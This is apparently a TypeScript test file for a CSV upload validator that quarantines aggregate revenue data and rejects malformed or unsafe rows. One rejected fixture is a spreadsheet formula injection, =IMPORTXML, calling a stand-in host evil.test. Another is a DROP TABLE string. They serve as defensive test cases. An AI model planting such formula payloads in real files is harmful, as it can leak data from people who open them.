import {describe, expect, test} from 'bun:test';
import {inspectDatasetUpload, parseCsv} from './preview.ts';

const header = 'month,region,revenue_eur,order_count\r\n';
describe('approved aggregate CSV onboarding quarantine', () =>
{
    test('validates an explicit template and returns bounded inspection, not executable data', () =>
    {
        const preview = inspectDatasetUpload(`${header}"2026-06","West",123.45,4\r\n2026-05,East,0,0`);
        expect(preview.rowCount).toBe(2); expect(preview.rows[0]).toEqual({month: '2026-06', region: 'West', revenue_eur: 123.45, order_count: 4});
        expect(preview.status).toBe('quarantined'); expect(preview.executable).toBeFalse(); expect(preview.fingerprint).toMatch(/^[a-f0-9]{64}$/);
        expect(preview.warnings.join(' ')).toContain('not added to the chat dataset');
    });
    test.each([
        `${header}2026-06,West,=IMPORTXML("https://evil.test"),1`, `${header}2026-13,West,2,1`,
        `${header}2026-06,tenant-secret,2,1`, `${header}2026-06,West,-2,1`, `${header}2026-06,West,NaN,1`,
        `${header}2026-06,West,1,1.5`, `${header}2026-06,West,2,1\n2026-06,West,3,2`,
        'email,phone,query\na@b.test,1,DROP TABLE', `${header}2026-06,West,2,1,extra`,
        `${header}2026-06,"West,2,1`, `${header}\0`, `${header}2026-06,"West"suffix,2,1`
    ])('rejects unsafe or incompatible data without activation', (csv) => expect(() => inspectDatasetUpload(csv)).toThrow());
    test('enforces row, cell and byte bounds before retaining preview rows', () =>
    {
        expect(() => parseCsv('x'.repeat(201))).toThrow('200');
        expect(() => inspectDatasetUpload('x'.repeat(256 * 1024 + 1))).toThrow('256');
        expect(() => parseCsv(Array.from({length: 1002}, () => 'a,b,c,d').join('\n'))).toThrow('1000');
        expect(parseCsv('"a""b",c\r\n')).toEqual([['a"b', 'c']]);
    });
});
